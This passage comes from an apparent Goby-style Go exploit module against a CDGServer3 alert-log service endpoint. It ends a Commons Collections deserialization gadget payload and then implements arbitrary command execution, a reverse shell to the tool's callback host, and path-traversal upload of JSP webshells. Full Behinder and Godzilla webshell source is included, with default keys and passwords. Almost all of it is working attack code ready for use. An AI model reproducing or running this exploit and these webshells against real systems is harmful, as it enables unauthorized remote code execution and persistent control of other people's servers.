mgAAAEYAEQAAAQAAAgECAAgBAwAtAQYAMAEEADEBBwA1AQkATAEKAHEBDQB0AQsAdQEPAHkBEQB/ARIAjwETAKYBFgCpARQAqgEYAAEAqwAAAAIArA==&quot;;
clz = defineClass(base64DecodeToByte(code));clz.newInstance();</string>
                </iArgs>
              </org.apache.commons.collections.functors.InvokerTransformer>
            </iTransformers>
          </factory>
        </default>
        <map/>
      </org.apache.commons.collections.map.LazyMap>
    </map>
    <key class="string">foo</key>
  </org.apache.commons.collections.keyvalue.TiedMapEntry>
</set>`
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	checkFileSetEstAlertLogServiceQZKEHDJWJKQ := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig(filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	uploadFlagZztsY23 := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		savePathMap := map[string]string{
			`/idmstudy/` + filename: `/idmstudy/` + filename,
			`/ROOT/` + filename:     `/` + filename,
		}
		for filename := range savePathMap {
			if resp, err := sendPayloadSetEstAlertLogServiceXOIUWRNDASIJ(hostInfo, fmt.Sprintf("$$$$$./../webapps/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content)))); resp == nil && err != nil {
				return nil, err
			}
			if resp, _ := checkFileSetEstAlertLogServiceQZKEHDJWJKQ(hostInfo, savePathMap[filename]); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
				return resp, nil
			}
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			resp, _ := sendPayloadSetEstAlertLogServiceXOIUWRNDASIJ(hostInfo, "echo "+checkString)
			success := resp != nil && strings.Contains(resp.Utf8Html, checkString)
			if success {
				stepLogs.VulURL = hostInfo.FixedHostInfo + `/CDGServer3/SetEstAlertLogService`
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			webshell := ss.Params["webshell"].(string)
			if attackType == "cmd" {
				cmd := ss.Params["cmd"].(string)
				resp, err := sendPayloadSetEstAlertLogServiceXOIUWRNDASIJ(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && len(resp.Utf8Html) > 0 && strings.Contains(resp.Utf8Html, "FEPCCCLCEN") {
					expResult.Success = true
					expResult.Output = resp.Utf8Html[:strings.Index(resp.Utf8Html, "FEPCCCLCEN")]
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				sendPayloadSetEstAlertLogServiceXOIUWRNDASIJ(expResult.HostInfo, fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp))
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = ss.Params["content"].(string)
					filename = goutils.B2S(ss.Params["filename"])
				}
				if resp, err := uploadFlagZztsY23(expResult.HostInfo, filename, content); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
